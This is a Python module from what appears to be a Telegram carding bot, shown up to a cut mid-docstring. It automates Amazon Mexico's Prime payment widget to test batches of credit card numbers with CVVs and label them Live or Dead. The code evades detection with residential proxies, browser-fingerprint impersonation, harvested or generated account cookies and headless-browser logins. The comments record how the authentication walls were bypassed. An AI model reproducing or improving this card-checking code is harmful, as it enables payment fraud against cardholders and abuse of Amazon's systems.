"""Gate Amazon MX basado en el script funcional de evidencias.

Este módulo expone dos funciones async:
- amazon_check(card_data)
- amazon_check_multiple(cards_data, callback)

Lee la cookie de Amazon desde la variable de entorno AMAZON_COOKIE o desde
el archivo data/amazon_cookie.txt.

NOTA 2026-10-21 (ver Diagnóstico en cambios/README-2026-10-21-amz.md):
la entrada de Prime exige `openid.pape.max_auth_age=0`, así que **una cookie
guardada no basta**: Amazon redirige siempre a /ap/signin y nunca devuelve
`ppw-widgetState`. Medido contra 4 variantes de URL del entry y 3 cookies
reales. La única forma de cruzar el muro es autenticarse de verdad; por eso
el gate escala a un navegador real (Browserless) cuando la sesión guardada
está muerta. Ver bot/gates/amazon_browserless.py.
"""
from __future__ import annotations

import asyncio
import html
import json
import logging
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple

import requests
from curl_cffi import requests as curl_requests

from bot.config import (
    AMAZON_ACCOUNT_HOLDER_NAME,
    AMAZON_BROWSER_FALLBACK,
    AMAZON_BROWSER_VERSION,
    AMAZON_IMPERSONATE,
    gate_proxy,
)
from bot.gates import amazon_browserless, amazon_login, amazon_playwright
from bot.services.amazon_cookies import get_amazon_cookie
from bot.services.amazon_gen.suspension import detect_suspension

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Hilos: pool DEDICADO para el gate
# ---------------------------------------------------------------------------
# El gate hace trabajo bloqueante (HTTP a Amazon) dentro del event loop de
# aiogram. Si se usa el executor por defecto (`run_in_executor(None, ...)`),
# el gate compite con el resto de features por los mismos ~8 hilos y una
# tanda de /amzmass puede dejar al bot sin hilos libres.
# Aquí hay un pool propio y pequeño: el trabajo de Amazon es de red (no de
# CPU), así que 3-4 hilos bastan y acotan la carga sobre Amazon y el proxy.
AMAZON_MAX_WORKERS = int(os.getenv("AMAZON_MAX_WORKERS", "3"))
_EXECUTOR = ThreadPoolExecutor(
    max_workers=AMAZON_MAX_WORKERS,
    thread_name_prefix="amazon-gate",
)


def _run_blocking(fn, *args):
    """Ejecuta una función bloqueante en el pool dedicado del gate."""
    loop = asyncio.get_running_loop()
    return loop.run_in_executor(_EXECUTOR, fn, *args)

# Excepciones de red que capturan los dos clientes HTTP que usa el gate.
try:  # curl_cffi >= 0.7 expone su propio RequestException
    from curl_cffi.requests.exceptions import RequestException as _CurlRequestError
except Exception:  # pragma: no cover - versiones antiguas
    _CurlRequestError = requests.exceptions.RequestException  # type: ignore

_NETWORK_ERRORS = (requests.exceptions.RequestException, _CurlRequestError)


def _pick_mx_proxy() -> Optional[dict]:
    """Proxy residencial MX sticky (con lifetime) para todo el flujo."""
    proxy_url = gate_proxy("mx")
    if not proxy_url:
        return None
    return {"http": proxy_url, "https": proxy_url}


def _new_session():
    """Sesión HTTP con impersonación de navegador.

    `requests` plano deja la huella de TLS de Python y Amazon lo nota; el
    proyecto ya usa `curl_cffi` (ver bot/services/amazon_gen/curl_session.py)
    para el registro de cuentas, así que el gate usa lo mismo. La versión
    `impersonate` debe ir en cada request (no en el constructor) porque con
    los proxies IPRoyal el túnel CONNECT falla con 504 si se fija en el
    constructor: de eso se encarga ImpersonateSession.
    """
    from bot.services.amazon_gen.curl_session import ImpersonateSession

    return ImpersonateSession(impersonate=AMAZON_IMPERSONATE)



# ---------------------------------------------------------------------------
# Constantes de la API de Amazon MX
# ---------------------------------------------------------------------------
# Entry verificado contra la página viva (2026-10-09): el pipeline hp/wlp con
# sesión fresca responde 200 con widgetState + customerID. No se incluyen
# offerToken ni containerRequestId: Amazon los emite frescos por sesión y los
# valores viejos hardcodeados ya no sirven.
_AMAZON_PRIME_URL = (
    "https://www.amazon.com.mx/hp/wlp/pipeline/membersignup"
    "?campaignId=SlashPrime"
)

# URL más ligera para verificación de cookie (evita triggers de verificación en Prime)
_AMAZON_VERIFY_URL = "https://www.amazon.com.mx/gp/yourstore/home"

_HEADERS_BASE = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "es-MX,es;q=0.9,en;q=0.8",
    "user-agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        f"(KHTML, like Gecko) Chrome/{AMAZON_BROWSER_VERSION}.0.0.0 Safari/537.36"
    ),
    "device-memory": "8",
    "downlink": "1.5",
    "dpr": "1",
    "ect": "4g",
    "referer": "https://www.amazon.com.mx/amazonprime?ref_=nav_cs_primelink_nonmember",
    "rtt": "100",
    "sec-ch-device-memory": "8",
    "sec-ch-dpr": "1",
    "sec-ch-ua": (
        f'"Chromium";v="{AMAZON_BROWSER_VERSION}", "Not?A_Brand";v="24", '
        f'"Google Chrome";v="{AMAZON_BROWSER_VERSION}"'
    ),
    "sec-ch-ua-full-version-list": (
        f'"Chromium";v="{AMAZON_BROWSER_VERSION}.0.0.0", "Not?A_Brand";v="24.0.0.0", '
        f'"Google Chrome";v="{AMAZON_BROWSER_VERSION}.0.0.0"'
    ),
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": "19.0.0",
    "sec-ch-viewport-width": "891",
    "upgrade-insecure-requests": "1",
    "viewport-width": "891",
}

# ---------------------------------------------------------------------------
# Utilidades
# ---------------------------------------------------------------------------
def _get_cookie(user_id: Optional[int] = None) -> Optional[str]:
    """Obtiene la cookie de Amazon: primero la del usuario, luego .env o archivo."""
    # La cookie por usuario es async; el caller debe obtenerla antes si quiere usarla.
    # Esta función se mantiene para fallback global (sin user_id).
    cookie = os.getenv("AMAZON_COOKIE", "").strip()
    if cookie:
        return cookie
    path = Path("data/amazon_cookie.txt")
    if path.exists():
        text = path.read_text(encoding="utf-8").strip()
        if text:
            return text
    return None


async def _get_cookie_for_user(user_id: int) -> Optional[str]:
    """Obtiene la cookie de Amazon para un usuario, con fallback global."""
    user_cookie = await get_amazon_cookie(user_id)
    if user_cookie:
        return user_cookie
    return _get_cookie()


def _debug_save_response(step: str, response, cookie: str) -> None:
    """Guarda una respuesta de Amazon para diagnóstico, sin exponer la cookie."""
    try:
        debug_dir = Path("data/amazon_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        timestamp = int(time.time())
        file_path = debug_dir / f"{step}_{timestamp}.txt"

        text = response.text if hasattr(response, "text") else str(response)
        # Ocultar valores sensibles de la cookie
        for part in cookie.split(";"):
            part = part.strip()
            if "=" in part:
                key, value = part.split("=", 1)
                if value and len(value) > 4:
                    text = text.replace(value, f"<REDACTED:{key.strip()}>")

        headers = getattr(response, "headers", {})
        safe_headers = {k: v for k, v in headers.items() if k.lower() not in ("set-cookie", "cookie")}

        content = (
            f"STEP: {step}\n"
            f"STATUS: {getattr(response, 'status_code', 'N/A')}\n"
            f"URL: {getattr(response, 'url', 'N/A')}\n"
            f"TIME_ELAPSED: {getattr(response, 'elapsed', 'N/A')}\n"
            f"HEADERS: {safe_headers}\n"
            f"--- BODY ---\n{text[:50000]}\n"
        )
        file_path.write_text(content, encoding="utf-8")
    except Exception:
        pass


def _debug_save_payload(step: str, payload: Dict[str, str], cookie: str) -> None:
    """Guarda el payload enviado a Amazon para diagnóstico, sin exponer la cookie."""
    try:
        debug_dir = Path("data/amazon_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        timestamp = int(time.time())
        file_path = debug_dir / f"{step}_payload_{timestamp}.json"
        safe_payload = {k: v for k, v in payload.items()}
        safe_payload["_cookie_keys"] = [p.strip().split("=")[0] for p in cookie.split(";") if "=" in p]
        file_path.write_text(json.dumps(safe_payload, indent=2), encoding="utf-8")
    except Exception:
        pass


def _extract_amazon_error(response_text: str) -> Optional[str]:
    """Intenta extraer un mensaje de error legible de la respuesta de Amazon."""
    # Primero buscar mensajes visibles de rate-limit / seguridad en el HTML.
    visible_patterns = [
        r'Superaste el máximo de intentos permitidos[^<]*',
        r'vuelve a intentarlo después de \d+ horas[^<]*',
        r'no podrás agregar una tarjeta por los siguientes \d+ minutos[^<]*',
        r'no podrás agregar una tarjeta por las siguientes \d+ horas[^<]*',
        r'Contactar con servicio al cliente[^<]*',
    ]
    for pattern in visible_patterns:
        match = re.search(pattern, response_text, re.IGNORECASE)
        if match:
            return re.sub(r'\s+', ' ', match.group(0).strip())
    patterns = [
        r'"errorMessage"\s*:\s*"([^"]*)"',
        r'"error_title"\s*[^>]*>([^<]+)',
        r'"errorMessage"\s*>([^<]+)',
        r'class="a-alert-heading"[^>]*>([^<]+)',
        r'<h4[^>]*class="[^"]*a-alert-heading[^"]*"[^>]*>([^<]+)',
        r'data-a-expander-name="cvv_errors"[^>]*>.*?<span[^>]*>([^<]+)</span>',
        r'id="cvv_errors"[^>]*>.*?<span[^>]*>([^<]+)</span>',
    ]
    for pattern in patterns:
        match = re.search(pattern, response_text, re.DOTALL | re.IGNORECASE)
        if match:
            return re.sub(r'\s+', ' ', match.group(1).strip())
    return None


def _extract_decline_reason(response_text: str) -> Optional[str]:
    """Intenta extraer el motivo especifico de declinacion de la tarjeta."""
    text_lower = response_text.lower()
    keywords = [
        ("superaste el maximo de intentos permitidos", "Cuenta en rate limit de Amazon"),
        ("no podras agregar una tarjeta", "Cuenta bloqueada temporalmente por Amazon"),
        ("fondos insuficientes", "Fondos insuficientes"),
        ("insufficient funds", "Fondos insuficientes"),
        ("declinada por el banco", "Declinada por el banco"),
        ("declined by bank", "Declinada por el banco"),
        ("tarjeta invalida", "Tarjeta invalida"),
        ("invalid card", "Tarjeta invalida"),
        ("numero de tarjeta incorrecto", "Numero de tarjeta incorrecto"),
        ("incorrect card number", "Numero de tarjeta incorrecto"),
        ("fecha de vencimiento invalida", "Fecha de vencimiento invalida"),
        ("invalid expiration date", "Fecha de vencimiento invalida"),
        ("cvv incorrecto", "CVV incorrecto"),
        ("incorrect cvv", "CVV incorrecto"),
        ("no se pudo verificar el metodo de pago", "No se pudo verificar el metodo de pago"),
        ("unable to verify payment method", "No se pudo verificar el metodo de pago"),
        ("supero el limite", "Supero el limite de la tarjeta"),
        ("over the limit", "Supero el limite de la tarjeta"),
        ("rechazada", "Tarjeta rechazada"),
        ("rejected", "Tarjeta rechazada"),
    ]
    for keyword, reason in keywords:
        if keyword in text_lower:
            return reason
    # Extraer alert-heading como fallback
    alert = _extract_amazon_error(response_text)
    if alert:
        return alert
    return None


def _validate_card(card_data: str) -> Optional[Tuple[str, str, str, str]]:
    """Valida formato cc|mes|año|cvv."""
    parts = card_data.split("|")
    if len(parts) != 4:
        return None
    cc, mes, ano, cvv = (p.strip() for p in parts)

    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return None
    if not mes.isdigit() or not (1 <= int(mes) <= 12):
        return None
    if not ano.isdigit():
        return None
    if len(ano) == 4:
        ano = ano[-2:]
    if not (0 <= int(ano) <= 99):
        return None
    if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
        return None

    return cc, mes, ano, cvv


def _format_card(cc: str) -> str:
    """Formatea el número de tarjeta con espacios cada 4 dígitos."""
    return " ".join(cc[i : i + 4] for i in range(0, len(cc), 4))


def _verify_cookie(session: requests.Session, cookie: str, proxies: Optional[dict] = None) -> Tuple[bool, str, str]:
    """Verifica que la cookie sea valida antes de procesar tarjetas.

    Retorna una tupla (ok, classification, message):
      - classification: "valid" | "expired" | "suspended" | "verification_required" | "captcha" | "network_error" | "unknown"

    Nota (2026-10-09, verificado contra páginas reales): la home de Amazon MX
    ya no incluye ppw-widgetState, así que la sesión se detecta por saludo +
    customerId, que es lo que la página sí muestra. Buscar "ap/signin" en el
    cuerpo daba falso expirado porque hasta las sesiones vivas traen esos
    links en el nav. Tampoco se asume válida por traer at-main/at-acb en el
    texto: se vio cookie muerta con at-acbmx de 439 caracteres y página de
    "Hola, identifícate". La autoridad siempre es la red.

    Nota (2026-10-21): la verificación debe ir por el proxy residencial MX
    como el resto del gate. Desde la IP del VPS (datacenter) Amazon responde
    503 a /gp/yourstore/home y toda cookie salía clasificada como
    "unknown / puede estar bloqueada". Medido: 3/3 proxies MX -> 200 con
    customerID; directo -> 503.
    """
    headers = {**_HEADERS_BASE, "cookie": cookie}
    try:
        # Usar URL más ligera para no disparar verificaciones de Prime
        response = session.get(_AMAZON_VERIFY_URL, headers=headers, proxies=proxies, timeout=20)
    except _NETWORK_ERRORS as exc:
        logger.error("Amazon gate verify: error de conexion -> %s", exc)
        return False, "network_error", f"Error de conexion: {exc}"

    logger.info("Amazon gate verify: status=%s url=%s", response.status_code, response.url)
    _debug_save_response("verify_cookie", response, cookie)

    text = response.text
    text_lower = text.lower()

    if response.status_code == 401:
        return False, "expired", "Cookie expirada (401)."

    if response.status_code != 200:
        return False, "unknown", f"Amazon respondio status {response.status_code}. La cookie puede estar bloqueada o el endpoint cambio."

    captcha_markers = (
        "try different image",
        "please prove",
        "escribe los caracteres",
        "ingresa los caracteres",
        "introduce los caracteres",
    )
    if any(m in text_lower for m in captcha_markers):
        return False, "captcha", "CAPTCHA detectado. La IP/proxy o la cuenta estan siendo cuestionadas."

    # Orden corregido (2026-10-21): las señales en contra se evalúan ANTES del
    # "customerID" que declaraba la cookie válida. Una cuenta suspendida igual
    # trae customerID en la página, así que con el orden anterior el chequeo
    # de suspensión era código muerto y las cookies suspendidas se contaban
    # como buenas.
    if detect_suspension(text):
        return False, "suspended", "Cuenta suspendida por Amazon."

    # Redirecciones reales (por URL, no por texto: el cuerpo trae links
    # ap/signin hasta con sesión viva).
    if "/ax/claim" in response.url:
        return False, "verification_required", "Amazon solicito verificacion de cuenta (/ax/claim). La cookie esta en riesgo o la IP/proxy esta flaggeada."
    if "signin" in response.url:
        return False, "expired", "Cookie expirada: Amazon redirigio a login."

    # Señal positiva de sesión: la página logueada trae customerId real
    # (ej. "customerID":"A3O8IXPNIIYCBQ"). Sin sesión viene vacío.
    customer_id_match = (
        re.search(r'"customerID"\s*:\s*"([^"]+)"', text)
        or re.search(r'customerId\s*:\s*["\']([^"\']+)["\']', text, re.IGNORECASE)
    )
    customer_id = customer_id_match.group(1) if customer_id_match else ""
    if re.fullmatch(r"[A-Z0-9]{10,}", customer_id or ""):
        return True, "valid", "Cookie válida (sesión activa en Amazon)."

    # Señal de página sin sesión: el saludo "Hola, identifícate".
    if ("hola, identifícate" in text_lower or "hola, identificate" in text_lower
            or "hello, sign in" in text_lower):
        return False, "expired", "Cookie expirada: Amazon muestra la página sin sesión."

    # Sin señales en contra, asumimos OK para no marcar viva como muerta.
    logger.info("Amazon gate verify: sin señales de cierre de sesión, asumiendo valida")
    return True, "valid", "Cookie válida (home accesible)."


def _process_card(
    session,
    card_tuple: Tuple[str, str, str, str],
    card_index: int,
    cookie: str,
    proxies: Optional[dict] = None,
    bootstrap: Optional[Dict[str, str]] = None,
) -> Dict[str, str]:
    """Procesa una tarjeta completa contra Amazon Prime.

    `bootstrap` = {"widget_state": ..., "customer_id": ...} permite saltarse
    el paso 1 (el GET del entry de Prime) cuando el estado ya lo trajo un
    navegador real: con una cookie guardada ese GET SIEMPRE acaba en
    /ap/signin (muro `openid.pape.max_auth_age=0`), pero el navegador que
    acaba de autenticarse sí llega a la página con el widget.
    """
    cc_number, month, year, cvv = card_tuple
    card_display = _format_card(cc_number)
    card_masked = f"{cc_number[:6]}******{cc_number[-4:]}"

    # Amazon acepta año de 4 dígitos y mes con leading zero.
    if len(year) == 2:
        year_full = "20" + year
    else:
        year_full = year
    month_padded = month.zfill(2)

    headers = {**_HEADERS_BASE, "cookie": cookie}
    logger.info("Amazon gate: procesando tarjeta %s (#%d)", card_masked, card_index)

    # Usar proxy MX si no se pasó uno
    if proxies is None:
        proxies = _pick_mx_proxy()

    try:
        # --- Llamada 1: tokens iniciales ---
        initial_widgetstate = ""
        customer_id = ""

        if bootstrap:
            initial_widgetstate = bootstrap.get("widget_state") or ""
            customer_id = bootstrap.get("customer_id") or ""
            logger.info(
                "Amazon gate: step1 omitido (estado traido del navegador, ws=%d, cid=%s)",
                len(initial_widgetstate),
                customer_id or "-",
            )
        else:
            logger.info("Amazon gate: step1 GET %s", _AMAZON_PRIME_URL)
            response = session.get(_AMAZON_PRIME_URL, headers=headers, proxies=proxies, timeout=20)
            _debug_save_response("step1_init", response, cookie)
            logger.info("Amazon gate: step1 status=%s url=%s", response.status_code, response.url)

            if response.status_code == 401:
                return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Cookie expirada (401) en step1."}
            if response.status_code != 200:
                return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step1 fallo con status {response.status_code}."}

            # El markup del widget llega con doble escape HTML: se decodifica antes
            # de buscar (si no, el regex nunca coincide aunque la página lo traiga).
            step1_text = _clean_html(response.text)
            widgetstate_match = re.search(r'name="ppw-widgetState" value="(.*?)"', step1_text)
            customer_id_match = re.search(r'"customerID":\s*"([^"]+)"', step1_text)
            if not widgetstate_match or not customer_id_match:
                text_lower = response.text.lower()
                if "signin" in response.url or "ap/signin" in text_lower:
                    return {
                        "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
                        "message": (
                            "Prime pidió iniciar sesión de nuevo (muro max_auth_age=0: "
                            "con una cookie guardada Amazon nunca devuelve el widget)."
                        ),
                        "classification": "auth_wall",
                    }
                if "/ax/claim" in response.url:
                    return {
                        "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
                        "message": "Amazon puso esta cuenta en revisión y Prime no deja pasar ahorita. "
                        "Entra a amazon.com.mx en tu navegador y completa lo que pida, o verifica "
                        "con la sesión fresca de una cuenta recién creada con /gencookie.",
                        "classification": "verification_required",
                    }
                return {
                    "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
                    "message": "Amazon cambió la página de Prime y no se pudo leer. Intenta más tarde.",
                    "classification": "unknown_page",
                }

            initial_widgetstate = widgetstate_match.group(1)
            customer_id = customer_id_match.group(1)

        # --- Llamada 2: register ---
        headers_post = {
            **headers,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "host": "apx-security.amazon.com.mx",
        }
        payload = {
            "widgetState": initial_widgetstate,
            "clientId": "Subs:Prime",
            "creatablePaymentMethods": "CC",
        }
        _debug_save_payload("step2_register", payload, cookie)
        logger.info("Amazon gate: step2 POST register")
        register_response = session.post(
            "https://apx-security.amazon.com.mx/cpe/pm/register",
            headers=headers_post,
            data=payload,
            proxies=proxies,
            timeout=20,
        )
        _debug_save_response("step2_register", register_response, cookie)
        logger.info("Amazon gate: step2 status=%s", register_response.status_code)
        if register_response.status_code == 401:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Cookie expirada (401) en step2 (register)."}
        if register_response.status_code != 200:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step2 fallo con status {register_response.status_code}. Revisar data/amazon_debug/step2_register_*.txt"}

        new_widgetstate_match = re.search(
            r'name="ppw-widgetState" value="(.*?)"', _clean_html(register_response.text)
        )
        if not new_widgetstate_match:
            error_msg = _extract_amazon_error(register_response.text)
            detail = f" Amazon dice: {error_msg}" if error_msg else ""
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step2: no se obtuvo nuevo widgetState.{detail} Revisar data/amazon_debug/step2_register_*.txt"}
        new_widgetstate = new_widgetstate_match.group(1)

        # --- Llamada 3: identificar tipo ---
        # apx-widget-info: el ID de instancia del widget es dinámico; usamos valor base genérico
        headers3 = {
            **headers,
            "accept": "application/json, text/javascript, */*; q=0.01",
            "apx-widget-info": "Subs:Prime/desktop",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "host": "apx-security.amazon.com.mx",
            "origin": "https://apx-security.amazon.com.mx",
            "referer": "https://apx-security.amazon.com.mx/cpe/pm/register",
        }
        payload3 = {
            "ppw-jsEnabled": "true",
            "addCreditCardNumber": card_display,
            "ppw-widgetEvent": "IdentifyCreditCardEvent",
            "ppw-widgetState": new_widgetstate,
        }
        continue_url = (
            f"https://apx-security.amazon.com.mx/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget"
        )
        _debug_save_payload("step3_identify", payload3, cookie)
        logger.info("Amazon gate: step3 POST identify")
        continue_response = session.post(continue_url, headers=headers3, data=payload3, proxies=proxies, timeout=20)
        _debug_save_response("step3_identify", continue_response, cookie)
        logger.info("Amazon gate: step3 status=%s", continue_response.status_code)
        if continue_response.status_code == 401:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Cookie expirada (401) en step3 (identify)."}
        # El paso IdentifyCreditCardEvent a veces devuelve 400 con tarjetas desechables,
        # pero el flujo puede continuar con el widgetState anterior.
        if continue_response.status_code == 400:
            latest_widgetstate = new_widgetstate
            logger.info("Amazon gate: step3 devolvio 400, continuando con widgetState anterior")
        elif continue_response.status_code != 200:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step3 fallo con status {continue_response.status_code}. Revisar data/amazon_debug/step3_identify_*.txt"}
        else:
            # Buscar widgetState en la respuesta JSON
            widgetstate_match4 = re.search(r'"widgetState"\s*:\s*"([^"]*)"', continue_response.text)
            latest_widgetstate = widgetstate_match4.group(1) if widgetstate_match4 else new_widgetstate

        # --- Llamada 4: registrar tarjeta ---
        headers4 = {**headers3, "apx-widget-info": "Subs:Prime/desktop"}
        payload4 = {
            "ppw-widgetEvent": "AddCreditCardEvent",
            "ppw-jsEnabled": "true",
            "ppw-widgetState": latest_widgetstate,
            "ie": "UTF-8",
            "ppw-accountHolderName": AMAZON_ACCOUNT_HOLDER_NAME,
            "addCreditCardNumber": card_display,
            "ppw-expirationDate_month": month_padded,
            "ppw-expirationDate_year": year_full,
            "addCreditCardVerificationNumber": cvv,
            "ppw-addCreditCardVerificationNumber_isRequired": "true",
            "__sif_encrypted_hba_account_holder_name": AMAZON_ACCOUNT_HOLDER_NAME,
            "ppw-issuer": "Unknown",
        }
        register_url4 = (
            f"https://apx-security.amazon.com.mx/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget"
            "?sif_profile=APX-Encrypt-All-NA"
        )
        _debug_save_payload("step4_addcard", payload4, cookie)
        logger.info("Amazon gate: step4 POST addcard")
        register_response4 = session.post(register_url4, headers=headers4, data=payload4, proxies=proxies, timeout=20)
        _debug_save_response("step4_addcard", register_response4, cookie)
        logger.info("Amazon gate: step4 status=%s", register_response4.status_code)
        if register_response4.status_code == 401:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Cookie expirada (401) en step4 (addcard)."}
        if register_response4.status_code != 200:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step4 fallo con status {register_response4.status_code}. Revisar data/amazon_debug/step4_addcard_*.txt"}

        try:
            response_json = register_response4.json()
        except Exception as exc:
            logger.error("Amazon gate: step4 no devolvio JSON -> %s", exc)
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step4 no devolvio JSON valido: {exc}. Revisar data/amazon_debug/step4_addcard_*.txt"}

        auth_source_id = (
            response_json.get("additionalWidgetResponseData", {})
            .get("additionalData", {})
            .get("authenticationSourceId")
        )
        if not auth_source_id:
            error_msg = _extract_amazon_error(register_response4.text)
            detail = f" Amazon dice: {error_msg}" if error_msg else ""
            return {
                "status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error",
                "message": f"Step4: no se obtuvo authenticationSourceId.{detail} Revisar data/amazon_debug/step4_addcard_*.txt",
            }

        html_content = response_json.get("htmlContent", "")

        # Extracción robusta del serializedState siguiendo el script funcional de evidencias.
        options_match = re.search(r'var options = ({.*?});', html_content, re.DOTALL)
        if not options_match:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Step4: objeto options no encontrado. Revisar data/amazon_debug/step4_addcard_*.txt"}
        options_text = options_match.group(1)
        # El JSON real tiene: "testAjaxAuthenticationRequired":"false","clientId":"Subs:Prime","serializedState":"..."
        serialized_match = re.search(
            r'"testAjaxAuthenticationRequired"\s*:\s*"false"\s*,\s*"clientId"\s*:\s*"Subs:Prime"\s*,\s*"serializedState"\s*:\s*"([^"]*)"',
            options_text,
        )
        if not serialized_match:
            # Fallback: buscar solo serializedState
            serialized_match = re.search(r'"serializedState"\s*:\s*"([^"]*)"', options_text)
        if not serialized_match:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Step4: serializedState no encontrado. Revisar data/amazon_debug/step4_addcard_*.txt"}
        serialized_state = serialized_match.group(1)

        # --- Llamada 5: verificación CVV ---
        headers5 = {**headers4}
        payload5 = {
            "ppw-jsEnabled": "true",
            "ppw-widgetEvent": "CVVAuthenticateEvent",
            "ppw-widgetState": serialized_state,
            "ppw-authenticationSourceId": auth_source_id,
        }
        _debug_save_payload("step5_verify", payload5, cookie)
        logger.info("Amazon gate: step5 POST verify CVV")
        verify_response = session.post(continue_url, headers=headers5, data=payload5, proxies=proxies, timeout=20)
        _debug_save_response("step5_verify", verify_response, cookie)
        logger.info("Amazon gate: step5 status=%s", verify_response.status_code)
        if verify_response.status_code == 401:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Cookie expirada (401) en step5 (verify)."}
        if verify_response.status_code != 200:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step5 fallo con status {verify_response.status_code}. Revisar data/amazon_debug/step5_verify_*.txt"}

        try:
            verify_json = verify_response.json()
        except Exception as exc:
            logger.error("Amazon gate: step5 no devolvio JSON -> %s", exc)
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Step5 no devolvio JSON valido: {exc}. Revisar data/amazon_debug/step5_verify_*.txt"}

        if "additionalWidgetResponseData" not in verify_json:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Step5: respuesta incompleta. Revisar data/amazon_debug/step5_verify_*.txt"}

        additional_data = verify_json["additionalWidgetResponseData"].get("additionalData", {})
        status = additional_data.get("status", "Unknown")

        # Reintentos si queda PENDING: hasta 4 intentos con delay de 3s (flujo funcional).
        attempts = 0
        max_attempts = 4
        last_response_text = verify_response.text
        while status == "PENDING" and attempts < max_attempts:
            attempts += 1
            time.sleep(3)
            logger.info("Amazon gate: reintento %d por status PENDING", attempts)
            # OJO: este reintento necesita el MISMO proxy. Sin `proxies=` salía
            # por la IP del VPS (datacenter) y Amazon respondía 503, que el gate
            # leía como "PENDING" -> la tarjeta se marcaba Dead sin veredicto.
            retry_response = session.post(
                continue_url, headers=headers5, data=payload5, proxies=proxies, timeout=20
            )
            _debug_save_response(f"step5_retry_{attempts}", retry_response, cookie)
            logger.info("Amazon gate: retry %d status=%s", attempts, retry_response.status_code)
            try:
                retry_json = retry_response.json()
                if "additionalWidgetResponseData" in retry_json:
                    status = (
                        retry_json["additionalWidgetResponseData"]
                        .get("additionalData", {})
                        .get("status", "Unknown")
                    )
                    last_response_text = retry_response.text
                    if status != "PENDING":
                        break
            except Exception as exc:
                logger.warning("Amazon gate: retry %d no devolvio JSON -> %s", attempts, exc)

        logger.info("Amazon gate: resultado final para %s -> status=%s", card_masked, status)
        if status == "APPROVED":
            return {"status": "✅ Live", "message": f"Amazon aprobo la tarjeta ({card_display})"}
        if status == "DECLINED":
            reason = _extract_decline_reason(last_response_text)
            if reason:
                return {"status": "❌ Dead", "message": f"Tarjeta declinada: {reason}."}
            return {"status": "❌ Dead", "message": "Tarjeta declinada por Amazon."}
        if status == "PENDING":
            return {"status": "❌ Dead", "message": "Verificacion pendiente: Amazon no respondio aprobacion/rechazo."}
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Estado desconocido: {status}"}

    except _NETWORK_ERRORS as exc:
        logger.error("Amazon gate: error de red para %s -> %s", card_masked, exc)
        if "401" in str(exc):
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Cookie expirada o cuenta bloqueada (401)."}
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": f"Error de red: {exc}"}
    except Exception as exc:
        logger.exception("Error inesperado en Amazon gate: %s", exc)
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error interno al procesar la tarjeta."}


# ---------------------------------------------------------------------------
# Escalado: sesión viva (cookie nueva + estado del widget)
# ---------------------------------------------------------------------------
# Muros de cuenta: no tienen sentido reintentar en otro cliente (HTTP o
# navegador), porque el bloqueo es de la cuenta, no del transporte.
_ACCOUNT_LEVEL_WALLS = {"cvf", "otp", "suspended", "bad_credentials"}

# Cuentas que se prueban antes de rendirse (la más reciente primero).
_MAX_ACCOUNTS_TRY = 3


async def _acquire_live_session() -> Optional[Dict[str, str]]:
    """Consigue una sesión de Prime utilizable: cookie + widgetState + customerID.

    Orden de intento:
      1. Login por HTTP (`bot/gates/amazon_login.py`): rápido (~15 s) y no
         necesita navegador. Cruza el muro `max_auth_age=0` porque la
         autenticación ocurre en esa misma sesión.
